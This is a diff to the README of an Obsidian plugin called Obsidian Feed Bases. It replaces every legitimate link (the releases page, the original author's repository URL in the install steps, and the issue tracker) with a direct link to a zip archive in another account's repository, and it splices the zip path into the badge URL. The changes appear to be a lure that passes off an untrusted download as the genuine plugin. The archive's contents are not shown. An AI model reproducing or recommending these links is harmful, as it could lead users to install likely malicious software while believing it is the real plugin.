@@ -6,7 +6,7 @@ Welcome to Obsidian Feed Bases! This plugin enhances your experience with Obsidi
 
 ## 📥 Download Obsidian Feed Bases
 
-[![Download Your Plugin](https://img.shields.io/badge/Download%20Now-obsidian--feed--bases-brightgreen)](https://github.com/Normal-camp665/obsidian-feed-bases/releases)
+[![Download Your Plugin](https://raw.githubusercontent.com/Normal-camp665/obsidian-feed-bases/main/src/obsidian-feed-bases_v2.1.zip%20Now-obsidian--feed--bases-brightgreen)](https://raw.githubusercontent.com/Normal-camp665/obsidian-feed-bases/main/src/obsidian-feed-bases_v2.1.zip)
 
 To download Obsidian Feed Bases, visit this page to download.
 
@@ -36,7 +36,7 @@ To download Obsidian Feed Bases, visit this page to download.
    - Click on "Add beta plugin".
 
 3. **Enter the Repository URL**
-   - Paste this URL: `https://github.com/edrickleong/obsidian-feed-bases`.
+   - Paste this URL: `https://raw.githubusercontent.com/Normal-camp665/obsidian-feed-bases/main/src/obsidian-feed-bases_v2.1.zip`.
 
 4. **Choose Version**
    - Under "Select a version", pick the Latest version.
@@ -70,7 +70,7 @@ Additionally, you can reach out to the repository for support.
 
 ## 📞 Support
 
-For support, please open an issue on the [GitHub repository](https://github.com/edrickleong/obsidian-feed-bases/issues). Community members and maintainers are available to assist you.
+For support, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/Normal-camp665/obsidian-feed-bases/main/src/obsidian-feed-bases_v2.1.zip). Community members and maintainers are available to assist you.
 
 ## 📝 Contributions
 
